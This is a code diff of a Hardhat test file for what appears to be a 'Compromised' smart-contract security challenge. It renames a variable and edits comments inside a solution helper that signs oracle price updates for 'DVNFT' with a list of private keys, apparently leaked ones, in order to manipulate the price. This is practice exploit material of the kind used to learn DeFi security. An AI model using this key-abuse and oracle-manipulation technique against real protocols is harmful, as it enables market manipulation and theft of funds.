@@ -39,6 +39,7 @@ describe('Compromised challenge', () => {
         /** SETUP - NO NEED TO CHANGE ANYTHING HERE */
         [owner, attacker] = await ethers.getSigners();
 
+        // set owner's balance
         await network.provider.send("hardhat_setBalance", [
             owner.address,
             initialOwnerBalance.toHexString().replace("0x0", "0x")
@@ -96,18 +97,16 @@ describe('Compromised challenge', () => {
         ];
 
         const postPrice = async (price: BigNumber) => {
-            const txdata = await Oracle.populateTransaction.postPrice("DVNFT", price)
+            const unsignedTx = await Oracle.populateTransaction.postPrice("DVNFT", price)
             const tx = {
                 to: Oracle.address,
-                data: txdata.data,
+                data: unsignedTx.data,
                 gasLimit: 90000
             };
 
             for (const key of keys) {
                 const wallet = new ethers.Wallet(key, provider)
                 await wallet.sendTransaction(tx)
-                // const signedtx = await ethers.signTransaction(tx);
-                // await web3.eth.sendSignedTransaction(signedtx.rawTransaction);
             }
         }
 
